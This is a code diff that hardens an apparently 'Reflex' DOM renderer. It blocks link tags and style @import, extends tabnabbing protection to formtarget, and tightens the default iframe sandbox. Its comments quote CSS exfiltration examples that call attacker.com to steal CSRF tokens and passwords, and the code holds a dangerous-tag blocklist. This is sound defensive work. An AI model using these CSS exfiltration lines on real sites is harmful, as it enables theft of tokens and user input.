@@ -23,25 +23,32 @@ import { validateSink, getBlockReason } from '../core/sinks.js';
 export { SafeHTML };
 
 /**
- * SECURITY FIX (Audit Issue #2): Dangerous Tag Whitelist
+ * SECURITY FIX (Audit Issue #2 + v6 Issue #4): Dangerous Tag Blocklist
  *
  * These tags can execute code or load external resources in dangerous ways:
  * - script: Direct JavaScript execution
  * - base: Hijacks relative URLs for the entire document
  * - object/embed/applet: Plugin execution, can bypass CSP
  * - meta: Can redirect via refresh, set CSP, etc.
- * - link: Can load external stylesheets (data exfiltration)
+ * - link: Can load external stylesheets (CSS exfiltration via keylogger.css)
  * - iframe: Embed external content (handled separately with sandbox)
+ *
+ * v6 CRITICAL FIX (Issue #4): Added 'link' to dangerous tags
+ * External stylesheets enable CSS-based data exfiltration without JavaScript:
+ *   <link rel="stylesheet" href="http://attacker.com/keylogger.css">
+ * Using CSS attribute selectors, an attacker can exfiltrate:
+ *   - CSRF tokens: input[name="csrf_token"][value^="a"] { background: url(...) }
+ *   - User input: input[value^="password"] { background: url(...) }
  *
  * NOTE: We allow iframe creation but enforce sandbox attribute in setAttribute.
  */
-const DANGEROUS_TAGS = /^(script|base|object|embed|applet)$/i;
+const DANGEROUS_TAGS = /^(script|base|object|embed|applet|link)$/i;
 
 /**
  * Tags that require special handling but aren't outright blocked.
  * These are allowed but with additional security enforcement.
  */
-const RESTRICTED_TAGS = /^(meta|link|iframe)$/i;
+const RESTRICTED_TAGS = /^(meta|iframe|style)$/i;
 
 /**
  * CSS Transition helper for enter/leave animations.
@@ -429,11 +436,15 @@ export const DOMRenderer: IRendererAdapter = {
       return;
     }
 
-    // SECURITY FIX (Audit Issue #5): Reverse Tabnabbing Protection
-    // When target="_blank" is set, the opened page gets a reference to your
-    // app via window.opener and can redirect your app to a phishing site.
-    // Automatically add rel="noopener noreferrer" to prevent this attack.
-    if (name === 'target' && value === '_blank') {
+    // SECURITY FIX (Audit Issue #5 + v6 Issue #2): Reverse Tabnabbing Protection
+    // When target="_blank" or formtarget="_blank" is set, the opened page gets
+    // a reference to your app via window.opener and can redirect your app to a
+    // phishing site. Automatically add rel="noopener noreferrer" to prevent this.
+    //
+    // CRITICAL FIX (v6 Issue #2): Also check formtarget attribute
+    // HTML5 allows <button type="submit" formtarget="_blank"> which bypasses
+    // the previous target-only check.
+    if ((name === 'target' || name === 'formtarget') && value === '_blank') {
       const currentRel = (node.getAttribute('rel') || '').toLowerCase();
       if (!currentRel.includes('noopener')) {
         const newRel = (currentRel + ' noopener noreferrer').trim();
@@ -441,18 +452,27 @@ export const DOMRenderer: IRendererAdapter = {
       }
     }
 
-    // SECURITY FIX (Audit Issue #7): Iframe Sandboxing
+    // SECURITY FIX (Audit Issue #7 + v6 Issue #1): Secure Iframe Sandboxing
     // Iframes act as windows to other contexts. Best practice is to enforce
-    // least privilege by adding sandbox by default. We set a reasonable default
-    // that allows scripts but restricts navigation.
+    // least privilege by adding sandbox by default.
+    //
+    // CRITICAL FIX (v6 Issue #1): Iframe Sandbox Escape Prevention
+    // The combination of 'allow-scripts' AND 'allow-same-origin' allows sandbox bypass:
+    // - allow-same-origin gives iframe access to parent.document
+    // - allow-scripts allows the iframe to run JavaScript
+    // - Together, the iframe can remove its own sandbox attribute and reload
+    //
+    // SECURE DEFAULT: allow-scripts + allow-forms (NO allow-same-origin)
+    // This allows interactive content but prevents sandbox escape.
+    // If same-origin is truly needed, developers must explicitly set it.
     if (node.tagName === 'IFRAME' && name === 'src') {
       if (!node.hasAttribute('sandbox')) {
-        // Default sandbox: allow scripts and same-origin for functionality,
-        // but prevent navigation and form submission to protect parent frame
-        node.setAttribute('sandbox', 'allow-scripts allow-same-origin');
+        // SECURE: Allow scripts and forms but BLOCK same-origin to prevent sandbox escape
+        node.setAttribute('sandbox', 'allow-scripts allow-forms');
         if (typeof process !== 'undefined' && process.env?.NODE_ENV !== 'production') {
-          console.info(`Reflex Security: Auto-applied sandbox="allow-scripts allow-same-origin" ` +
-            `to iframe. Set sandbox attribute explicitly to customize.`);
+          console.info(`Reflex Security: Auto-applied sandbox="allow-scripts allow-forms" ` +
+            `to iframe. Set sandbox attribute explicitly if you need allow-same-origin ` +
+            `(WARNING: allow-scripts + allow-same-origin together allows sandbox escape).`);
         }
       }
     }
@@ -503,8 +523,48 @@ export const DOMRenderer: IRendererAdapter = {
     node.dispatchEvent(new CustomEvent(event, { detail, bubbles: true }));
   },
 
-  setTextContent(node: Text, text: string): void {
-    node.nodeValue = text;
+  setTextContent(node: Text | Element, text: string): void {
+    // SECURITY FIX (v6 Issue #6): Validate Style Tag Content
+    // <style> tag text content bypasses the Sink Gate (validateSink) because
+    // setTextContent was never validated. Attackers can inject:
+    //   @import "http://attacker.com/malicious.css";
+    // This enables CSS-based data exfiltration without triggering any security checks.
+    //
+    // FIX: If the node is a Text node inside a <style> element, or is a <style>
+    // element itself, validate the content for dangerous CSS patterns.
+    const parentElement = (node as Text).parentElement;
+    const isStyleContent = (
+      (node.nodeType === 3 && parentElement?.tagName === 'STYLE') || // Text node in <style>
+      ((node as Element).tagName === 'STYLE') // <style> element directly
+    );
+
+    if (isStyleContent) {
+      // Block @import - enables external CSS loading for data exfiltration
+      if (/@import\s/i.test(text)) {
+        if (typeof process !== 'undefined' && process.env?.NODE_ENV !== 'production') {
+          console.warn(`Reflex Security: Blocked @import in <style> tag content. ` +
+            `@import enables CSS-based data exfiltration.`);
+        }
+        return; // Silently drop
+      }
+
+      // Block other dangerous CSS patterns (expression, javascript: in url)
+      if (!validateSink('style', text)) {
+        if (typeof process !== 'undefined' && process.env?.NODE_ENV !== 'production') {
+          console.warn(`Reflex Security: Blocked dangerous CSS pattern in <style> tag content.`);
+        }
+        return; // Silently drop
+      }
+    }
+
+    // Standard text content assignment
+    if (node.nodeType === 3) {
+      // Text node
+      (node as Text).nodeValue = text;
+    } else {
+      // Element node (for <style> elements)
+      (node as Element).textContent = text;
+    }
   },
 
   setInnerHTML(node: Element, html: SafeHTML | string, options?: { force?: boolean }): void {
